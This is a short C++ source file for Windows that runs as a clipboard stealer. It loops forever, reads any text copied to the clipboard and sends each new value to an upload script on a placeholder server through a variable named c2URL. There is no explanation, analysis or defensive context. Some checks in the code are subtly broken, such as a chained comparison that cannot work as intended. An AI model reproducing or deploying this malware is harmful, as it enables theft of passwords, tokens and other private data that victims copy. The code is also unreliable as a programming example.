#include <iostream>
#include <Windows.h>
#include <list>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

using namespace std;
void uploadClipboardData(string clipboardData) {
    string url = "http://yourdomainname.com/upload.php?data=";
    url = url + clipboardData;
    const char* c2URL = url.c_str();
    IStream* stream;
    unsigned long bytesRead;
    try {
        URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    }
    catch (exception) {
    }
}


int main() {
    string dataLastSent;
    while (TRUE) {
        try {
            CloseClipboard();
            if (OpenClipboard(NULL)) {
                HANDLE clipboardHandle;
                clipboardHandle = GetClipboardData(CF_TEXT);
                char* clipboardData = (char*)GlobalLock(clipboardHandle);
                if (clipboardData != NULL) {
                    for (int i = 0; clipboardData[i] == NULL; i++) {
                        if (127 < int(clipboardData[i]) < 0) {
                            return 1;
                        }
                    }
                    string str(clipboardData);
                    if (dataLastSent.compare(str) != 0) {
                        dataLastSent = str;
                        uploadClipboardData(dataLastSent);
                    }
                }
            }
        }
        catch (exception) {
            continue;
        }
    }
}